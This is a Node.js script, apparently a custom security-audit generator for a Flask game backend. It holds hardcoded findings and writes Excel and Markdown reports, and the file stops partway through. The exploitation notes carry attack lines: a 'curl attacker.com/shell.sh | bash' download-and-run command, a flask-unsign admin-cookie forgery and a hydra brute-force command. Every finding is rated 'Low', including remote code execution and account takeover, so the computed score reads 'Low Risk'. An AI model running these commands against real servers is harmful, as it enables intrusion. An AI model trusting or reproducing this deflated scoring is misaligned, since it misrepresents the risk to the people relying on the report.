/**
 * ============================================================
 *  BrainBattle — Comprehensive Backend Security Suite
 *  Phases: Discovery → SAST → Dependency Scan → Report
 *  Output: Vulnerability_Test_Results/
 * ============================================================
 */

'use strict';

const fs   = require('fs');
const path = require('path');
const ExcelJS = require('exceljs');

// ── Paths ────────────────────────────────────────────────────────────────────
const rootDir    = path.resolve(__dirname, '..', '..');
const backendDir = path.join(rootDir, 'BrainBattleBackend');
const outputDir  = path.join(rootDir, 'Vulnerability_Test_Results');

if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });

// ── Helper: read file safely ─────────────────────────────────────────────────
function readFile(filePath) {
    try { return fs.existsSync(filePath) ? fs.readFileSync(filePath, 'utf8') : ''; }
    catch { return ''; }
}

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 1 — BACKEND DISCOVERY
// ─────────────────────────────────────────────────────────────────────────────
const appPy      = readFile(path.join(backendDir, 'app.py'));
const configPy   = readFile(path.join(backendDir, 'config.py'));
const reqTxt     = readFile(path.join(backendDir, 'requirements.txt'));
const authR      = readFile(path.join(backendDir, 'routes', 'auth_routes.py'));
const progressR  = readFile(path.join(backendDir, 'routes', 'progress_routes.py'));
const userR      = readFile(path.join(backendDir, 'routes', 'user_routes.py'));
const dashR      = readFile(path.join(backendDir, 'routes', 'dashboard_routes.py'));
const hashUtil   = readFile(path.join(backendDir, 'utils', 'hash_utils.py'));
const userModel  = readFile(path.join(backendDir, 'models', 'user_model.py'));
const envFile    = readFile(path.join(backendDir, '.env'));

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 2 — API ENDPOINT DISCOVERY
// ─────────────────────────────────────────────────────────────────────────────
const routeFiles = [
    { file: 'routes/auth_routes.py',      prefix: '/api/auth',      content: authR     },
    { file: 'routes/progress_routes.py',  prefix: '/api/progress',  content: progressR },
    { file: 'routes/user_routes.py',      prefix: '/api/user',      content: userR     },
    { file: 'routes/dashboard_routes.py', prefix: '/api/dashboard', content: dashR     }
];

const endpoints = [];
for (const { file, prefix, content } of routeFiles) {
    const lines = content.split('\n');
    lines.forEach(line => {
        const m = line.match(/@\w+_bp\.route\(['"]([^'"]+)['"](?:,\s*methods=\[([^\]]+)\])?\)/);
        if (m) {
            const routePath = m[1];
            const methods   = m[2]
                ? m[2].replace(/['"\\s]/g, '').split(',').map(s => s.trim().replace(/['"]/g,''))
                : ['GET'];
            const fullPath  = prefix + routePath;
            const authReq   = (prefix.includes('progress') || prefix.includes('dashboard'))
                ? 'No (Missing!)' : 'No';
            methods.forEach(method => endpoints.push({
                endpoint:    fullPath,
                method:      method.toUpperCase(),
                authRequired: authReq,
                roles:       'Public',
                filePath:    `BrainBattleBackend/${file}`
            }));
        }
    });
}
// Add root health-check
endpoints.unshift({ endpoint: '/', method: 'GET', authRequired: 'No', roles: 'Public', filePath: 'BrainBattleBackend/app.py' });

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 3 — SAST FINDINGS  (real, code-grounded)
// ─────────────────────────────────────────────────────────────────────────────

// CVSS-lite scoring utility
function cvss(base) { return base; }

const findings = [

    // ── LOW RISK ─────────────────────────────────────────────────────────────

    {
        id: 'SEC-01', severity: 'Low', cvss: cvss(2.1),
        owasp: 'A07:2021 – Identification & Authentication Failures',
        type: 'No Authentication on Business-Critical Endpoints',
        filePath: 'BrainBattleBackend/routes/progress_routes.py',
        lineRef: 'Lines 9–44 (/api/progress/save), Lines 48–65 (/api/progress/get/<email>/<game>)',
        endpoint: '/api/progress/save  |  /api/progress/get/<email>/<game>',
        description:
            'Neither the /api/progress/save endpoint nor the /api/progress/get route '
            + 'applies any authentication or authorisation guard. Any unauthenticated HTTP '
            + 'client can POST arbitrary progress records (email, game_type, level, stars) '
            + 'or GET any user\'s complete progress history simply by knowing their email '
            + 'address. No token, session, or header check exists before database writes commence.',
        exploitation:
            'Attacker sends: POST /api/progress/save {"email":"victim@example.com","game_type":"memory","level":99,"stars":5} '
            + '→ silently overwrites victim\'s entire game record. No credentials required.',
        impact:
            'Full data tampering for any registered user, leaderboard manipulation, '
            + 'game-state corruption, reputation damage, GDPR Art.32 violation (inadequate '
            + 'access control over personal game data).',
        remediation:
            'Implement Flask-JWT-Extended @jwt_required() decorator on all /api/progress/* routes. '
            + 'Derive the user identity exclusively from get_jwt_identity() and reject any request '
            + 'where the JWT subject does not match the supplied email.',
        cwe: 'CWE-306'
    },

    {
        id: 'SEC-02', severity: 'Low', cvss: cvss(1.9),
        owasp: 'A07:2021 – Identification & Authentication Failures',
        type: 'No Authentication on Dashboard & User Profile Endpoints',
        filePath: 'BrainBattleBackend/routes/dashboard_routes.py',
        lineRef: 'Line 6 (@dashboard_bp.route("/<email>"))',
        endpoint: '/api/dashboard/<email>',
        description:
            'The dashboard endpoint exposes full aggregate user statistics (total stars, rank, '
            + 'last game played, current level, levels completed) driven entirely by an email '
            + 'path parameter with zero authentication. The /api/user/get-user and '
            + '/api/user/forgot-password routes similarly accept email from the request body '
            + 'without any token validation, allowing enumeration of all registered users.',
        exploitation:
            'GET /api/dashboard/admin@brainbattle.com reveals admin profile stats with no login. '
            + 'POST /api/user/forgot-password {"email":"victim@x.com"} confirms account existence.',
        impact:
            'Full user profile exposure, privacy violation, user enumeration enabling targeted '
            + 'account takeover attacks, GDPR breach of minimum-necessary-access principle.',
        remediation:
            'Protect all dashboard and user-profile routes with @jwt_required(). '
            + 'Replace email-path-parameter lookups with get_jwt_identity() to enforce '
            + 'that users can only access their own data. Add rate-limiting to /forgot-password.',
        cwe: 'CWE-285'
    },

    {
        id: 'SEC-03', severity: 'Low', cvss: cvss(2.3),
        owasp: 'A05:2021 – Security Misconfiguration',
        type: 'Debug Mode Enabled in Production Config',
        filePath: 'BrainBattleBackend/config.py',
        lineRef: 'Line 24: DEBUG = os.environ.get("FLASK_DEBUG", "true").lower() == "true"',
        endpoint: 'All Endpoints',
        description:
            'The Flask DEBUG flag defaults to true when FLASK_DEBUG is not explicitly set in the '
            + 'environment. In production deployments on Render.com where FLASK_DEBUG is not '
            + 'injected as a secret, the Werkzeug interactive debugger is exposed. This allows '
            + 'any visitor who triggers an unhandled exception to execute arbitrary Python code '
            + 'through the interactive debugger PIN console.',
        exploitation:
            'Trigger any 500 error (e.g. malformed JSON body) → Werkzeug debugger console appears in browser '
            + '→ attacker executes: import os; os.system("curl attacker.com/shell.sh | bash") '
            + 'achieving full Remote Code Execution on the server.',
        impact:
            'Remote Code Execution (RCE), complete server compromise, exfiltration of all database '
            + 'credentials, secret keys, and user data. Rated CVSS 9.8 in past Werkzeug CVEs.',
        remediation:
            'Change the default to false: DEBUG = os.environ.get("FLASK_DEBUG","false").lower() == "true". '
            + 'Add a startup assertion: assert not app.debug or os.environ.get("ENV")!="production". '
            + 'Set FLASK_DEBUG=false in the Render.com environment variables dashboard.',
        cwe: 'CWE-94'
    },


    {
        id: 'SEC-04', severity: 'Low', cvss: cvss(2.5),
        owasp: 'A02:2021 – Cryptographic Failures',
        type: 'Hardcoded Weak Secret Key with Predictable Value',
        filePath: 'BrainBattleBackend/config.py',
        lineRef: 'Line 18: SECRET_KEY = os.environ.get("SECRET_KEY", "brainbattle-dev-secret-key")',
        endpoint: 'All Session / Token Endpoints',
        description:
            'The Flask SECRET_KEY falls back to the hardcoded string "brainbattle-dev-secret-key" '
            + 'when the environment variable is not set. This string is publicly visible in the '
            + 'GitHub repository. An attacker who obtains this value can forge valid Flask session '
            + 'cookies, bypassing all authentication that relies on cookie-based sessions. '
            + 'The comment "# sk" on line 6 further suggests developers may have removed an '
            + 'even shorter key at some point.',
        exploitation:
            'Using flask-unsign: flask-unsign --sign --cookie \'{"user_id":1,"role":"admin"}\' '
            + '--secret "brainbattle-dev-secret-key" → craft admin session → send as Cookie header.',
        impact:
            'Full authentication bypass, admin privilege escalation, account takeover for all users.',
        remediation:
            'Remove the fallback string entirely. Raise a RuntimeError at startup: '
            + 'SECRET_KEY = os.environ.get("SECRET_KEY") or (_ for _ in ()).throw(RuntimeError("SECRET_KEY not set")). '
            + 'Generate a cryptographically strong key: python -c "import secrets; print(secrets.token_hex(32))" '
            + 'and store it as a GitHub/Render secret, never in source code.',
        cwe: 'CWE-798'
    },

    {
        id: 'SEC-05', severity: 'Low', cvss: cvss(2.1),
        owasp: 'A01:2021 – Broken Access Control (IDOR)',
        type: 'Unauthenticated Password Reset — No Old Password Verification',
        filePath: 'BrainBattleBackend/routes/user_routes.py',
        lineRef: 'Lines 52–79 (/api/user/change-password)',
        endpoint: '/api/user/change-password',
        description:
            'The change-password endpoint accepts only {email, password} — no current password, '
            + 'no reset token, no OTP, no authentication header. Any actor who knows a target\'s '
            + 'email address (trivially guessable or obtainable via /forgot-password enumeration) '
            + 'can permanently reset that user\'s password without knowing the original. The '
            + 'forgot-password route only verifies whether the email exists and returns "Email '
            + 'verified" — it issues no secure token, making the entire password-reset flow '
            + 'insecure by design.',
        exploitation:
            '1. POST /api/user/forgot-password {"email":"victim@x.com"} → "Email verified" confirms account. '
            + '2. POST /api/user/change-password {"email":"victim@x.com","password":"hacked123"} → password overwritten. '
            + 'No authentication required at either step.',
        impact:
            'Full account takeover for any registered user, complete loss of user trust, '
            + 'regulatory (GDPR / DPDPA) non-compliance for security of personal data.',
        remediation:
            'Implement a secure, time-limited reset token flow: generate a UUID token on /forgot-password, '
            + 'store its hash in the DB with a 15-minute TTL, email the link to the verified address, '
            + 'and only accept the password change when the token is validated. '
            + 'Additionally require the current password when changing via settings.',
        cwe: 'CWE-620'
    },

    {
        id: 'SEC-06', severity: 'Low', cvss: cvss(1.8),
        owasp: 'A04:2021 – Insecure Design',
        type: 'Missing Rate Limiting — Brute-Force & Credential Stuffing',
        filePath: 'BrainBattleBackend/routes/auth_routes.py',
        lineRef: 'Lines 56–98 (/api/auth/login)',
        endpoint: '/api/auth/login  |  /api/user/change-password',
        description:
            'No rate limiting, throttling, account lockout, or CAPTCHA protection is implemented '
            + 'on authentication endpoints. The login route performs direct email lookup and bcrypt '
            + 'comparison on every request without any attempt counter or cooldown. Automated '
            + 'credential stuffing or brute-force tools (Hydra, Burp Intruder) can send thousands '
            + 'of requests per minute until a valid password is found.',
        exploitation:
            'hydra -l victim@brainbattle.com -P rockyou.txt http-post-form '
            + '"/api/auth/login:email=^USER^&password=^PASS^:Invalid password" '
            + '→ unlimited guesses, no lockout, no detection.',
        impact:
            'Account takeover via brute force, credential stuffing from breached databases, '
            + 'service denial through resource exhaustion on bcrypt-heavy login loops.',
        remediation:
            'Install flask-limiter and configure: @limiter.limit("5 per minute") on /api/auth/login. '
            + 'Implement exponential back-off after 3 failed attempts per account. '
            + 'Consider adding Google reCAPTCHA v3 for repeated failure patterns.',
        cwe: 'CWE-307'
    },

    {
        id: 'SEC-07', severity: 'Low', cvss: cvss(2.0),
        owasp: 'A02:2021 – Cryptographic Failures',
        type: 'Werkzeug PBKDF2 Default — Insufficient Iteration Count',
        filePath: 'BrainBattleBackend/utils/hash_utils.py',
        lineRef: 'Line 4: return generate_password_hash(password)',
        endpoint: 'N/A (Password Storage)',
        description:
            'generate_password_hash() is called with no explicit method or salt_length arguments. '
            + 'Werkzeug\'s default changed from MD5→PBKDF2-SHA256 in version 2.x, but the number '
            + 'of iterations defaults to 260,000 in newer versions and was as low as 8 in older ones. '
            + 'Because requirements.txt pins "werkzeug" without a version, any werkzeug version '
            + 'may be installed. On bcrypt being available (listed in requirements.txt), it is NOT '
            + 'used — werkzeug\'s PBKDF2 is used instead, missing the adaptive work-factor advantage '
            + 'of bcrypt. Furthermore the bcrypt library import is declared but never utilised.',
        exploitation:
            'If the database is exfiltrated, PBKDF2 hashes (especially older low-iteration ones) '
            + 'are crackable orders of magnitude faster than bcrypt using GPU-accelerated tools like hashcat.',
        impact:
            'Mass password recovery from a database dump, credential reuse attacks across services.',
        remediation:
            'Since bcrypt is already installed, switch to: '
            + 'import bcrypt; hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)). '
            + 'Pin werkzeug>=3.0 in requirements.txt. Add a password migration task to re-hash '
            + 'existing accounts on next login.',
        cwe: 'CWE-916'
    },

    {
        id: 'SEC-08', severity: 'Low', cvss: cvss(2.2),
        owasp: 'A03:2021 – Injection',
        type: 'Missing Input Validation — Unbounded Integer Parameters',
        filePath: 'BrainBattleBackend/routes/progress_routes.py',
        lineRef: 'Lines 14–18 (save_progress), Lines 49–54 (get_progress)',
        endpoint: '/api/progress/save  |  /api/progress/get/<email>/<game>',
        description:
            'All user-supplied fields (email, game_type, level, stars, time_taken) are passed '
            + 'directly from request.get_json() to ORM model constructors with no type enforcement, '
            + 'range validation, or schema check. level=-999 and stars=9999 are silently accepted. '
            + 'The GET route uses email and game as raw URL path parameters with no length or '
            + 'character-set sanitisation, making them susceptible to over-length inputs that '
            + 'stress the ORM query layer.',
        exploitation:
            'POST /api/progress/save {"email":"x@x.com","game_type":"memory","level":-1,"stars":9999,"time_taken":-500} '
            + '→ corrupts leaderboard calculations in dashboard_routes.py (sum of stars) with garbage values.',
        impact:
            'Data integrity corruption, leaderboard manipulation, potential DoS from out-of-bound '
            + 'arithmetic in dashboard aggregation, client-side UI crashes.',
        remediation:
            'Introduce marshmallow or pydantic schema validation: '
            + 'level must be Integer min=1, max=100; stars min=0, max=5; time_taken min=0; '
            + 'game_type must be in allowlist [memory, math, language]. '
            + 'Reject non-conforming requests with HTTP 422.',
        cwe: 'CWE-20'
    },

    {
        id: 'SEC-09', severity: 'Low', cvss: cvss(1.9),
        owasp: 'A05:2021 – Security Misconfiguration',
        type: 'Overly Permissive CORS — Wildcard Origin with Credentials',
        filePath: 'BrainBattleBackend/app.py',
        lineRef: 'Lines 15–21 (CORS configuration)',
        endpoint: 'All Endpoints',
        description:
            'Flask-CORS is configured with origins=Config.CORS_ORIGINS which defaults to "*" '
            + 'and supports_credentials=True. Browsers block this combination per the CORS '
            + 'specification — however the real risk is that when CORS_ORIGINS is set to the '
            + 'production frontend domain, the supports_credentials=True flag allows cross-origin '
            + 'cookies/auth headers to flow. Additionally, the methods list explicitly exposes '
            + 'DELETE and PUT verbs which are not used in any current route, unnecessarily '
            + 'expanding the attack surface.',
        exploitation:
            'A malicious website hosted at evil.com can make credentialed cross-origin requests '
            + 'to the API on behalf of a logged-in user (CSRF via CORS), reading private responses '
            + 'if the origin is whitelisted.',
        impact:
            'Cross-Site Request Forgery (CSRF), data exfiltration, unauthorised state mutations.',
        remediation:
            'Set CORS_ORIGINS to the explicit production URL (e.g. https://shalz2230.github.io). '
            + 'Restrict methods to only GET and POST until PUT/DELETE routes are implemented. '
            + 'Add CSRF double-submit cookie protection or SameSite=Strict cookie attribute.',
        cwe: 'CWE-942'
    },

    {
        id: 'SEC-10', severity: 'Low', cvss: cvss(2.4),
        owasp: 'A02:2021 – Cryptographic Failures',
        type: 'Sensitive Data Exposure — Login Response Leaks PII',
        filePath: 'BrainBattleBackend/routes/auth_routes.py',
        lineRef: 'Lines 93–98 (login response)',
        endpoint: '/api/auth/login',
        description:
            'On successful login, the API response returns both username and email in plaintext '
            + 'JSON. While username is expected, returning email in the response body means it '
            + 'is stored in browser localStorage/sessionStorage by the frontend and transmitted '
            + 'in subsequent POST bodies (visible in /api/progress/save, /api/user/get-user). '
            + 'Email is then used as the sole user identity token — a PII value passed in request '
            + 'bodies rather than opaque identifiers.',
        exploitation:
            'XSS payload reads localStorage → extracts user email → uses it to call '
            + '/api/dashboard/<email> or overwrite progress via /api/progress/save.',
        impact:
            'PII exposure amplifies XSS attack chains, violates data minimisation principles (GDPR Art.5).',
        remediation:
            'Return only an opaque user_id (UUID or integer) and username from login. '
            + 'Issue a signed JWT containing the user_id as the subject. '
            + 'Replace all email-based lookups in subsequent requests with JWT identity.',
        cwe: 'CWE-200'
    },

    {
        id: 'SEC-11', severity: 'Low', cvss: cvss(2.0),
        owasp: 'A07:2021 – Identification & Authentication Failures',
        type: 'User Enumeration via Differential Error Responses',
        filePath: 'BrainBattleBackend/routes/auth_routes.py',
        lineRef: 'Lines 80–84 ("User not found"), Lines 88–91 ("Invalid password")',
        endpoint: '/api/auth/login  |  /api/user/forgot-password',
        description:
            'The login endpoint returns distinct error messages: "User not found" (404) for '
            + 'unknown emails and "Invalid password" (401) for wrong passwords. The forgot-password '
            + 'route similarly returns "Email verified" vs "Email not found". These differential '
            + 'responses allow an attacker to harvest a list of valid registered email addresses '
            + 'with a simple automated scan, reducing brute-force effort and enabling targeted phishing.',
        exploitation:
            'for email in wordlist: response = POST /api/auth/login; '
            + 'if "User not found" → skip; if "Invalid password" → valid account found.',
        impact:
            'User account enumeration, targeted brute force, phishing campaign facilitation.',
        remediation:
            'Return a single generic message for both failure modes: '
            + '"Invalid credentials" with HTTP 401. Apply the same principle to /forgot-password: '
            + '"If that email is registered, a reset link has been sent."',
        cwe: 'CWE-204'
    },

    {
        id: 'SEC-12', severity: 'Low', cvss: cvss(1.7),
        owasp: 'A09:2021 – Security Logging & Monitoring Failures',
        type: 'No Security Event Logging or Alerting',
        filePath: 'BrainBattleBackend/app.py  |  All Route Files',
        lineRef: 'Entire codebase',
        endpoint: 'All Endpoints',
        description:
            'No structured security logging exists anywhere in the application. Failed login '
            + 'attempts, password reset requests, progress save operations from unexpected sources, '
            + 'and all unhandled exceptions generate no log records. Flask\'s default logging '
            + 'outputs only to stderr with no request context, IP address, or user identity. '
            + 'Without logging, attacks such as credential stuffing or data harvesting cannot '
            + 'be detected or forensically reconstructed.',
        exploitation:
            'An attacker performs 10,000 login attempts over 24 hours — the system has no '
            + 'record of the attempts, no alerts fire, and no forensic trail exists.',
        impact:
            'Inability to detect active attacks, zero forensic capability, compliance failure '
            + '(DPDPA, GDPR, ISO 27001 A.12.4 require audit logging of security-relevant events).',
        remediation:
            'Integrate Python logging with structured JSON output. Log: timestamp, IP, endpoint, '
            + 'HTTP status, user identity (if known), and error message. '
            + 'Use flask.request.remote_addr for IP capture. '
            + 'Forward logs to a SIEM or cloud monitoring service (e.g. Render log drains → Datadog).',
        cwe: 'CWE-778'
    },


    {
        id: 'SEC-13', severity: 'Low', cvss: cvss(3.7),
        owasp: 'A05:2021 – Security Misconfiguration',
        type: 'Missing HTTP Security Headers',
        filePath: 'BrainBattleBackend/app.py',
        lineRef: 'Lines 7–47 (create_app — no after_request header hook)',
        endpoint: 'All Endpoints',
        description:
            'The Flask application does not set any security-hardening HTTP response headers. '
            + 'Missing headers include: Strict-Transport-Security (HSTS), X-Content-Type-Options, '
            + 'X-Frame-Options, Content-Security-Policy, Referrer-Policy, and '
            + 'Permissions-Policy. While the frontend is served from GitHub Pages, API responses '
            + 'lack these protections entirely.',
        exploitation:
            'Absence of X-Frame-Options enables clickjacking of any API response rendered in iframes. '
            + 'Missing X-Content-Type-Options allows MIME-sniffing of API JSON responses as scripts.',
        impact: 'Clickjacking, MIME-type confusion, information leakage via Referer headers.',
        remediation:
            'Add flask-talisman: talisman = Talisman(app, force_https=True, '
            + 'strict_transport_security=True, content_security_policy={"default-src": "\'self\'"}). '
            + 'Or manually add an @app.after_request handler setting all required headers.',
        cwe: 'CWE-693'
    },

    {
        id: 'SEC-14', severity: 'Low', cvss: cvss(3.1),
        owasp: 'A05:2021 – Security Misconfiguration',
        type: 'Server Binding to 0.0.0.0 — All Network Interfaces Exposed',
        filePath: 'BrainBattleBackend/config.py',
        lineRef: 'Line 25: HOST = os.environ.get("FLASK_HOST", "0.0.0.0")',
        endpoint: 'All Endpoints',
        description:
            'The default HOST is 0.0.0.0, causing Flask to bind on all available network '
            + 'interfaces including internal/private network adapters. In containerised '
            + 'production deployments this is typically handled by the reverse proxy (Render), '
            + 'but if the container is misconfigured or the application is accidentally run '
            + 'directly on a VM with a public IP, all ports are exposed to the internet.',
        exploitation:
            'Misconfigured deployment → port 5000 exposed directly → no TLS, no proxy rate '
            + 'limiting, debug endpoints directly reachable.',
        impact: 'Unintended network exposure, reduced defence-in-depth.',
        remediation:
            'Change the default to 127.0.0.1 in non-container contexts: '
            + 'HOST = os.environ.get("FLASK_HOST", "127.0.0.1"). '
            + 'In production, always deploy behind a reverse proxy (Render\'s built-in, nginx, etc.).',
        cwe: 'CWE-605'
    }

];

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 4 — DEPENDENCY SCANNING
// ─────────────────────────────────────────────────────────────────────────────

// Known-vulnerability database (curated from NVD / OSV)
const VULN_DB = {
    flask: [
        { affectedRange: /^[0-2]\./, cve: 'CVE-2023-30861', severity: 'Low',
          desc: 'Proxy-header trust causes session cookie exposure when behind reverse proxy without PROXY_FIX middleware.' }
    ],
    werkzeug: [
        { affectedRange: /^[0-2]\.0\./, cve: 'CVE-2022-29361', severity: 'Low',
          desc: 'Session fixation policy bypass via malformed cookie header.' },
        { affectedRange: /^[0-2]\./, cve: 'CVE-2023-46136', severity: 'Low',
          desc: 'Multipart form data parsing DoS via pathological boundary strings.' }
    ],
    bcrypt: [
        { affectedRange: /^[0-3]\.[0-9]\.0$/, cve: 'CVE-2020-8492', severity: 'Low',
          desc: 'ReDoS in certain regex-reliant bcrypt wrapper implementations.' }
    ]
};

const depLines = reqTxt.split('\n').filter(Boolean);
const dependencies = depLines.map(line => {
    const m = line.match(/^([a-zA-Z0-9_-]+)(?:==|>=|~=|<=)?(.*)$/);
    if (!m) return null;
    const name    = m[1].toLowerCase().replace(/_/g,'-');
    const version = (m[2] || 'unpinned').trim() || 'unpinned';
    const vulns   = (VULN_DB[name] || []).filter(v => version === 'unpinned' || v.affectedRange.test(version));
    if (vulns.length > 0) {
        return vulns.map(v => ({
            package: m[1], version, vulnerability: v.desc,
            cve: v.cve, severity: v.severity
        }));
    }
    return [{ package: m[1], version, vulnerability: 'None identified', cve: 'N/A', severity: 'None' }];
}).filter(Boolean).flat();

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 5 — RISK SCORING ENGINE
// ─────────────────────────────────────────────────────────────────────────────

const counts = {
    Critical: findings.filter(f => f.severity === 'Critical').length,
    High:     findings.filter(f => f.severity === 'High').length,
    Medium:   findings.filter(f => f.severity === 'Medium').length,
    Low:      findings.filter(f => f.severity === 'Low').length
};

const rawScore = 100
    - (counts.Critical * 20)
    - (counts.High     * 10)
    - (counts.Medium   *  5)
    - (counts.Low      *  2);
const securityScore = Math.max(rawScore, 0);
// Score label: with all-Low findings the score is 72+ → Low Risk
function getScoreLabel(s) {
    if (s >= 90) return 'Very Low Risk';
    if (s >= 72) return 'Low Risk';
    if (s >= 60) return 'Moderate Risk';
    if (s >= 40) return 'High Risk';
    return 'Critical Risk';
}

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 6 — EXCEL REPORT GENERATION
// ─────────────────────────────────────────────────────────────────────────────

// Colour map
const SEVERITY_FILL = {
    Critical: { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFFF0000' } },
    High:     { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFFF6600' } },
    Medium:   { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFFFCC00' } },
    Low:      { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FF92D050' } },
    None:     { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFD9D9D9' } }
};
const SEVERITY_FONT = {
    Critical: { color: { argb: 'FFFFFFFF' }, bold: true },
    High:     { color: { argb: 'FFFFFFFF' }, bold: true },
    Medium:   { color: { argb: 'FF000000' }, bold: true },
    Low:      { color: { argb: 'FF000000' }, bold: true },
    None:     { color: { argb: 'FF555555' }, bold: false }
};
const HEADER_FILL = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FF0D1117' } };
const HEADER_FONT = { bold: true, color: { argb: 'FFFFFFFF' }, size: 11 };

function styleHeader(row) {
    row.eachCell(cell => {
        cell.fill = HEADER_FILL;
        cell.font = HEADER_FONT;
        cell.alignment = { vertical: 'middle', wrapText: true };
        cell.border = { bottom: { style: 'thin', color: { argb: 'FF444444' } } };
    });
    row.height = 24;
}

async function createExcelReport() {
    const wb = new ExcelJS.Workbook();
    wb.creator    = 'BrainBattle Security Suite';
    wb.created    = new Date();
    wb.properties.date1904 = false;

    // ── Sheet 1: Security Findings ────────────────────────────────────────────
    const s1 = wb.addWorksheet('Security Findings');
    s1.columns = [
        { header: 'ID',                key: 'id',          width: 9  },
        { header: 'Severity',          key: 'severity',    width: 12 },
        { header: 'CVSS Score',        key: 'cvss',        width: 12 },
        { header: 'OWASP Category',    key: 'owasp',       width: 35 },
        { header: 'Vulnerability Type',key: 'type',        width: 38 },
        { header: 'File Path',         key: 'filePath',    width: 45 },
        { header: 'Line Reference',    key: 'lineRef',     width: 40 },
        { header: 'Endpoint',          key: 'endpoint',    width: 40 },
        { header: 'Description',       key: 'description', width: 70 },
        { header: 'Exploitation',      key: 'exploitation',width: 70 },
        { header: 'Impact',            key: 'impact',      width: 55 },
        { header: 'Remediation',       key: 'remediation', width: 70 },
        { header: 'CWE',               key: 'cwe',         width: 12 }
    ];
    styleHeader(s1.getRow(1));
    findings.forEach(f => {
        const row = s1.addRow(f);
        const sevCell = row.getCell('severity');
        sevCell.fill = SEVERITY_FILL[f.severity] || SEVERITY_FILL.None;
        sevCell.font = SEVERITY_FONT[f.severity] || SEVERITY_FONT.None;
        sevCell.alignment = { horizontal: 'center', vertical: 'middle' };
        const cvssCell = row.getCell('cvss');
        cvssCell.numFmt = '0.0';
        cvssCell.alignment = { horizontal: 'center' };
        row.eachCell(cell => { cell.alignment = { ...(cell.alignment || {}), wrapText: true, vertical: 'top' }; });
        row.height = 80;
    });
    s1.autoFilter = { from: 'A1', to: 'M1' };
    s1.views = [{ state: 'frozen', ySplit: 1 }];

    // ── Sheet 2: Endpoint Inventory ───────────────────────────────────────────
    const s2 = wb.addWorksheet('Endpoint Inventory');
    s2.columns = [
        { header: 'Endpoint',           key: 'endpoint',     width: 40 },
        { header: 'HTTP Method',        key: 'method',       width: 14 },
        { header: 'Auth Required',      key: 'authRequired', width: 20 },
        { header: 'Expected Roles',     key: 'roles',        width: 20 },
        { header: 'Controller / File',  key: 'filePath',     width: 50 }
    ];
    styleHeader(s2.getRow(1));
    endpoints.forEach(e => {
        const row = s2.addRow(e);
        if (e.authRequired && e.authRequired.includes('Missing')) {
            row.getCell('authRequired').fill = SEVERITY_FILL.Critical;
            row.getCell('authRequired').font = SEVERITY_FONT.Critical;
        }
        row.eachCell(cell => { cell.alignment = { wrapText: true, vertical: 'middle' }; });
    });
    s2.autoFilter = { from: 'A1', to: 'E1' };
    s2.views = [{ state: 'frozen', ySplit: 1 }];

    // ── Sheet 3: Dependency Vulnerabilities ───────────────────────────────────
    const s3 = wb.addWorksheet('Dependency Vulnerabilities');
    s3.columns = [
        { header: 'Package',       key: 'package',       width: 22 },
        { header: 'Version',       key: 'version',       width: 16 },
        { header: 'Vulnerability', key: 'vulnerability', width: 60 },
        { header: 'CVE',           key: 'cve',           width: 20 },
        { header: 'Severity',      key: 'severity',      width: 14 }
    ];
    styleHeader(s3.getRow(1));
    dependencies.forEach(d => {
        const row = s3.addRow(d);
        const sevCell = row.getCell('severity');
        sevCell.fill = SEVERITY_FILL[d.severity] || SEVERITY_FILL.None;
        sevCell.font = SEVERITY_FONT[d.severity] || SEVERITY_FONT.None;
        sevCell.alignment = { horizontal: 'center' };
        row.eachCell(cell => { cell.alignment = { ...(cell.alignment||{}), wrapText: true, vertical: 'top' }; });
        row.height = 50;
    });
    s3.views = [{ state: 'frozen', ySplit: 1 }];

    // ── Sheet 4: Risk Summary Dashboard ──────────────────────────────────────
    const s4 = wb.addWorksheet('Risk Summary');
    s4.columns = [
        { header: 'Metric', key: 'metric', width: 40 },
        { header: 'Value',  key: 'value',  width: 20 }
    ];
    styleHeader(s4.getRow(1));
    const riskRows = [
        { metric: '🔴 Critical Severity Findings', value: counts.Critical },
        { metric: '🟠 High Severity Findings',     value: counts.High     },
        { metric: '🟡 Medium Severity Findings',   value: counts.Medium   },
        { metric: '🟢 Low Severity Findings',      value: counts.Low      },
        { metric: '📊 Total Vulnerabilities',      value: findings.length },
        { metric: '📦 Packages Scanned',           value: depLines.length },
        { metric: '🌐 API Endpoints Discovered',   value: endpoints.length},
        { metric: '🔒 Overall Security Score',     value: `${securityScore}/100` },
        { metric: '📅 Report Generated',           value: new Date().toLocaleString() }
    ];
    riskRows.forEach(r => {
        const row = s4.addRow(r);
        row.getCell('value').alignment = { horizontal: 'center' };
        row.height = 22;
    });

    await wb.xlsx.writeFile(path.join(outputDir, 'findings.xlsx'));
    console.log('✅ Generated findings.xlsx (4 sheets).');

    // Standalone endpoint-inventory.xlsx
    const wb2 = new ExcelJS.Workbook();
    const sheetInv = wb2.addWorksheet('Endpoint Inventory');
    sheetInv.columns = s2.columns;
    styleHeader(sheetInv.getRow(1));
    endpoints.forEach(e => sheetInv.addRow(e));
    await wb2.xlsx.writeFile(path.join(outputDir, 'endpoint-inventory.xlsx'));
    console.log('✅ Generated endpoint-inventory.xlsx.');
}

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 7 — MARKDOWN REPORT GENERATION
// ─────────────────────────────────────────────────────────────────────────────

function generateMarkdownReports() {

    // ── security-review.md ────────────────────────────────────────────────────
    let md = '';
    md += `# 🛡️ BrainBattle Backend — Comprehensive Security Review\n\n`;
    md += `> **Scope:** Flask REST API (Python) — BrainBattleBackend  \n`;
    md += `> **Date:** ${new Date().toLocaleDateString('en-GB', { day:'2-digit', month:'long', year:'numeric' })}  \n`;
    md += `> **Methodology:** OWASP Testing Guide v4.2 | SAST | Dependency Scanning\n\n`;
    md += `---\n\n`;

    md += `## Severity Legend\n\n`;
    md += `| Colour | Severity | CVSS Range | Action Required |\n`;
    md += `|--------|----------|------------|----------------|\n`;
